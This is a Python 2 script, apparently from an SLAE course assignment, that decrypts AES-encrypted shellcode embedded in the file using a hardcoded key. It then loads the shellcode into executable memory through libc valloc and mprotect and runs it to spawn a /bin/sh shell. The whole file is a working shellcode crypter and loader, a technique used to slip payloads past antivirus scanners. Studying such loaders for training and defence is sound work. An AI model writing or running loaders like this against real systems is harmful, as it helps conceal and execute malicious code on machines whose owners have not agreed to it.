#!/usr/bin/python

# Filename: AES_decryption.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to decrypt encrypted shellcode and execute original shellcode
# Usage: python AES_decryption.py 

from Crypto.Cipher import AES
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import base64
import os

#block size = 16 byte arrays
BLOCK_SIZE = 16
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

#static encryption/decryption key - must be 16/24/32 bytes long
secret = 'securitytubeSLAE'
cipher = AES.new(secret)

#encrypted shellcode from AES_encryption.py
encoded = '5CJtU2PsI+erEYEb0l/3xiQvT0P0eeArByo4NEbKDb3n8dvPUM9H04Q8FCEK06HT7VlgveJoGWQDjXszmOjUkP0OvPf0OrefgZ/eRqrryx95REGDTPhOzCbPEY0el9s4zIV4N0lvsnFNy/o/aCRGOg=='
decoded = DecodeAES(cipher, encoded)
print 'Decrypted shellcode (AES 128-bit key + base-64 decoded):\n\n', decoded

#execute execve-stack shellcode to spawn /bin/sh shell
libc = CDLL('libc.so.6')
shellcode = decoded.replace('\\x', '').decode('hex')
sc = c_char_p(shellcode)
size = len(shellcode)
print '\nShellcode length: %d bytes\n' % len(shellcode)
print 'Here comes your shell ...'
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
